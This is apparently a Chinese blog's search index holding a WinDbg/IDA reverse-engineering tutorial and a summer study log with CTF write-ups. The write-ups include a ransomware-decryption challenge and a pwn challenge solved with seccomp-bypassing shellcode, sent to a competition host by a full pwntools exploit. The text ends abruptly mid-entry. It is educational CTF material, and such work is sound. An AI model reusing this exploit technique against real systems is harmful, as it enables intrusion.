<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windbg+IDA逆向分析基础用法</title>
      <link href="/2024/07/11/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/"/>
      <url>/2024/07/11/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="windbg基础用法"><a href="#windbg基础用法" class="headerlink" title="windbg基础用法"></a>windbg基础用法</h2><h3 id="运行前"><a href="#运行前" class="headerlink" title="运行前"></a>运行前</h3><p>打开文件：<code>文件 -&gt; Launch executable</code></p><p>查看反编译汇编：<code>View -&gt; Layouts -&gt; Disassembly</code></p><p>设置符号路径：<code>.sympath srv*</code></p><p>加载符号：<code>.reload</code></p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>运行：<code>g</code></p><p>单步执行不进入函数：<code>p</code></p><p>单步执行进入函数：<code>t</code></p><h3 id="查看-x2F-修改状态"><a href="#查看-x2F-修改状态" class="headerlink" title="查看&#x2F;修改状态"></a>查看&#x2F;修改状态</h3><p>查看堆栈状态：<code>kb</code></p><p>查看寄存器：<code>r</code> &#x2F; <code>r register</code></p><p>修改寄存器：<code>r register = value</code></p><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p>查看指定地址反编译代码：<code>u addr</code></p><p>以双字的形式查看内存：</p><p><code>dd addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dd 0040000000400000  00405000 00406000 00407000 0040800000400010  00409000 0040A000 0040B000 0040C000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>dc addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dc 0040000000400000  00405000 00406000 00407000 00408000  .P...&#96;...p...&#96;...00400010  00409000 0040A000 0040B000 0040C000  ..&#96;...&#96;...&#96;...&#96;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以<code>Unicode</code>字符串的形式查看内存：<code>du addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; du 0040000000400000  &quot;Hello, world!&quot;00400010  &quot;This is a test string.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以字节的形式查看内存：<code>db addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; db 0040000000400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello, world!...00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以ASCII字符的形式查看内存：<code>da addr / register</code></p><p>以字的形式查看内存：<code>dw addr / register</code></p><p>以十六进制双字的形式查看内存：<code>dD addr / register</code></p><p>以内存内容的指针的形式查看内存：<code>dp addr / register</code></p><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><p>查看断点详细情况：<code>bl</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; bl     0 e Disable Clear  00000000 e 1 0001 (0001)  0:****      1 e Disable Clear  00300003     0001 (0001)  0:**** GOM32Q_vc120_ReleaseQC+0x3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看断点：<code>.bpcmds</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; .bpcmdsba0 e1 0x00000000 ;bp1 0x00300003 ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下断点：</p><p><code>bp</code> ：设置断点，在指定断点位置设置新的断点，如果调试器无法解析断点位置的地址表达式，则自动转换为bu断点，使用bp命令创建在卸载模块时不再处于活动状态的断点</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bp MyTest+0xb <span class="token number">7</span> <span class="token comment">#前六次忽略此断点，第七次传递时，执行会停止</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>bm</code>：设置符号断点，命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后，bm断点与bu断点相同。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bm myprogram<span class="token operator">!</span>mem*   <span class="token number">4</span>: 0040d070 MyProgram<span class="token operator">!</span>memcpy  <span class="token number">5</span>: 0040c560 MyProgram<span class="token operator">!</span>memmove  <span class="token number">6</span>: 00408960 MyProgram<span class="token operator">!</span>memset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>bu</code>：设置未解析断点，命令设置延迟或未解析的断点。bu断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 </p><h2 id="windbg结合IDA逆向分析"><a href="#windbg结合IDA逆向分析" class="headerlink" title="windbg结合IDA逆向分析"></a>windbg结合IDA逆向分析</h2><h3 id="通过IDA中的地址下断点"><a href="#通过IDA中的地址下断点" class="headerlink" title="通过IDA中的地址下断点"></a>通过IDA中的地址下断点</h3><p>地址偏移 &#x3D; <code>IDA中的地址 - IDA中的基址</code></p><p>查看模块名称&#x2F;地址：<code>lm</code> （基址为<code>start</code>一列</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> lmstart    end        module name00300000 010f9000   GOM32Q_vc120_ReleaseQC   <span class="token punctuation">(</span>no symbols<span class="token punctuation">)</span>           05990000 05a4c000   swscale_gp_5   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05a50000 05d69000   avutil_gp_56   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05d70000 07366000   avcodec_gp_58   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取<code>windbg</code>中的地址：<code>模块基址 + 地址偏移</code></p><p>下断点：<code>bu 模块名称 + 地址偏移</code> &#x2F; <code>bu windbg中的地址</code></p><p>例如：<code>IDA</code>中的基址为<code>0x400000</code>，要在<code>IDA</code>中地址为<code>0x500000</code>的位置下断点，则地址偏移为<code>0x500000 - 0x400000 = 0x100000</code>，假设<code>lm</code>查看模块名为<code>test</code>，该模块基址为<code>0x200000</code>，则在<code>windbg</code>中的地址就是<code>0x300000</code>，那么下断点就是<code>du test + 0x100000</code> &#x2F; <code>du 0x300000</code></p><h3 id="通过栈回溯找到IDA中对应函数"><a href="#通过栈回溯找到IDA中对应函数" class="headerlink" title="通过栈回溯找到IDA中对应函数"></a>通过栈回溯找到IDA中对应函数</h3><p>栈回溯查看堆栈情况：<code>kb</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb <span class="token comment"># ChildEBP RetAddr      Args to Child              </span>WARNING: Stack unwind information not available. Following frames may be wrong.00 014fedc0 009371cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de01 014fede4 00506a63     014feeec 00000104 0f4aeea8 GOM32Q_vc120_ReleaseQC+0x6371cc02 014ff138 004ed040     0f4cf948 00000001 0080723a GOM32Q_vc120_ReleaseQC+0x206a6303 014ff1fc 008082e2     00a9b640 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x1ed04004 014ff21c 0080392f     0000c391 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x5082e205 014ff28c 008040ea     0f4cd4c0 00010a66 0000c391 GOM32Q_vc120_ReleaseQC+0x50392f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到形如<code>模块名+地址偏移</code>的栈回溯，要找到在<code>IDA</code>中的对应基址只需要用模块名加上的这个地址偏移（即加号后面部分）再加上<code>IDA</code>基址即可</p><p>例如：<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>，则地址偏移为<code>0x6371de</code>，IDA基址为<code>0x400000</code>，那么在<code>IDA</code>中的地址就是<code>0x6371de + 0x400000 = 0xA371DE</code></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> windbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024暑期学习记录</title>
      <link href="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/"/>
      <url>/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>复盘了一下这学期欠缺的待学习内容，简单列了个学习计划，写了这篇博客记录一下暑假学习历程，也是激励自己每天多学一点</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92.png" class><h2 id="7-5"><a href="#7-5" class="headerlink" title="#7.5"></a>#7.5</h2><p>早上和晚上在打春秋杯夏季赛，下午被摇过去改论文，春秋杯打完就不打算打比赛啦，留时间把没完成的事完成一下，然后跟着学长一起复现</p><h3 id="初探勒索病毒"><a href="#初探勒索病毒" class="headerlink" title="初探勒索病毒"></a>初探勒索病毒</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：你服务器上的一张图片被Black Basta勒索病毒给加密了。当你在服务器上还原出该图片后，等待一分钟左右，&#x2F;flag就会变为可读权限。（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）（关注微信公众号“勒索病毒头条”，发送关键词“BASTA”可获取该题提示。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我选择直接获取提示</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【2024春秋杯夏季赛】https://www.nomoreransom.org/zh/decryption-tools.html搜索BlackBasta，并点击下载。（如果您还需要进一步的提示，可在本公众号输入“BASTA2”获取。）【2024春秋杯夏季赛】<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg.sah28vut5 ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题的判断依据是能不能正常访问<code>banana.jpg</code>这个图片，所以把<code>banana.jpg.sah28vut5</code>改成<code>banana.jpg</code>再用上面给的指令解密，图片在<code>/var/www/html</code>目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ./banana.jpg.sah28vut5 ./banana.jpg<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：The Fishmonger found a secured entrance to somewhere...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一道写<code>shellcode</code>的题，创建了一段可读可写可执行区域，写入<code>0x250</code>的数据后开了沙箱并对输入内容进行随机化操作，但是操作长度的判断是通过<code>strlen</code>获取的，所以直接输入<code>\x00</code>即可绕过</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x1337000</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1LL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1337000LL</span><span class="token punctuation">,</span> <span class="token number">0x250LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> len <span class="token operator">&lt;=</span> <span class="token number">0xAF</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">entrance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"Error triggered..."</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看沙箱内容，发现禁用了<code>execve execveat open read readv pread preadv write sendmsg</code>，最后选择用<code>openat preadv2 writev</code>，需要注意的是<code>preadv2 writev</code>的用法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">2147418112LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">59LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">322LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">17LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">295LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例如下，即<code>preadv2</code>的二参是一个结构体，且这个结构体包含了数据缓冲区地址以及长度，就相当于原来<code>read</code>的二参和三参</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/uio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYS_preadv2</span> <span class="token expression"><span class="token number">327</span></span></span><span class="token class-name">ssize_t</span> <span class="token function">preadv2</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">,</span> <span class="token class-name">off_t</span> offset<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_preadv2<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> iov<span class="token punctuation">,</span> iovcnt<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 打开文件</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 准备读取数据的缓冲区</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 设置读取操作的 iovec 结构体</span>    <span class="token keyword">struct</span> <span class="token class-name">iovec</span> iov<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_base <span class="token operator">=</span> buffer<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 preadv2 读取文件数据到缓冲区</span>    <span class="token class-name">ssize_t</span> bytes_read <span class="token operator">=</span> <span class="token function">preadv2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>iov<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes_read <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"preadv2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 输出读取的数据</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> bytes_read<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 关闭文件</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.128.163'</span><span class="token punctuation">,</span> <span class="token number">36703</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x00PP'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''/* openat(fd=-0x64, file='flag', oflag=0) */        add rax, 0x62        mov r12, rax        mov rsi, rax        mov rdi, -0x64        /* call openat() */        mov rax, 0x101 /* 0x101 */        syscall        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */        mov rdi, 3        mov rdx, 0x1        add r12, 0x15        mov rsi, r12        /* call preadv2() */        mov rax, 327        syscall        /* writev(fd=1, iovec=0x1337090, count=1) */        mov rdi, 1        mov rdx, 0x1        /* call writev() */        mov rax, 0x14        syscall'''</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> shellcode <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'flag\x00'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1337090</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'entrance'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-6"><a href="#7-6" class="headerlink" title="#7.6"></a>#7.6</h2><p>今天坐大牢，一个知识点没查到肝了半天，下午又被摇过去改申请书嘻嘻，晚上试图逆向分析复现一下比赛，<code>but</code>卡住了工具上，用<code>IDA</code>直接崩，<code>x64dbg</code>调到<code>crash</code>的位置了又换<code>windbg</code>，卡在软件下载和使用上了…都是代理惹的祸~</p><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>先检查保护</p><pre class="line-numbers 